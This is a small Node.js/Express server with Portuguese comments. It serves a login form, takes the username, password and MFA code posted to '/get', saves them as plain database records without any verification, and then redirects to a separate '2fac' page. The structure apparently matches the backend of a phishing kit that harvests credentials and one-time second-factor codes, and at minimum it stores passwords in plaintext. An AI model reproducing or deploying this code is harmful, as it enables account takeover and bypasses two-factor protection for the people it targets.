const express = require("express");
const app = express();
const path = require('path');
const user = require("./models/user.js")
const mfa = require("./models/MFA.js")

//configurando pasta "view" do handlebars para a pasta /views
app.set ('views', path.join (__dirname, "/views"))
//configurando o handlebars como view engine
app.set ('view engine', 'hbs')

//configurando o req.body / bodyparser
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

app.use(express.static("public"))



app.get("/", (req, res) => {
    //renderizando o arquivo html home.hbs dentro de views
    res.render("index");
})

app.post("/get", (req, res) => {
    //Criando um novo model com as informações que estão vindo do form la do home.hbs
    const usuario = new user({
        user: req.body.user,
        pass: req.body.pass
    })

    const fac = new mfa({
        MFA: req.body.mfa
    })
    
    //aqui estamos salvando esse model para o banco de dados
    usuario.save()
    fac.save()

    res.redirect("/2fac")
})

app.get("/2fac", (req, res) => {
    res.render("2fac")
})

//iniciando servidor
const port = 8080;
app.listen(port, () => {
    console.log(`Servidor rodando em localhost:${port}`);
})